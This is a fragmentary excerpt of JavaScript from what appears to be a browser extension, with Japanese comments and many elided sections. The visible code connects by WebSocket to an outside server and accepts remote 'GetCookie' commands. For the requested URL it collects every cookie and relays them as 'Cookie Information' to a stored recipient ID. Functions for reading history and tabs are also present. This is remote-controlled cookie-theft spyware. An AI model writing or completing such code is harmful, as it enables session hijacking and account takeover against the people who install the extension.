...
function getHistory() {
  ...
  function initWebSocket() {
    ...
    chrome.storage.local.get('key', function(result) {
      ...
      const SERVER_URL = 'wss://tester.psannetwork.net/'; // ここに適切なWebSocketサーバーのURLを入力
...
getTabs();
  ...
  // "GetCookies" の後ろに続く URL を取得
      const url = msg.slice("GetCookie".length).trim(); // "GetCookies" を取り除いた後、URLを抽出
...
function getCookie(url) {
    chrome.cookies.getAll({ url: url }, function (cookies) {
        ...
        // `sendingId`を取得して送信処理
        chrome.storage.local.get('sendingId', function (result) {
            const targetId = result.sendingId; // 送信先IDを取得
            if (!targetId) {
                console.log("No sending ID found in storage.");
                return;
            }

            const messageText = `Cookie Information: ${formattedCookies}`;
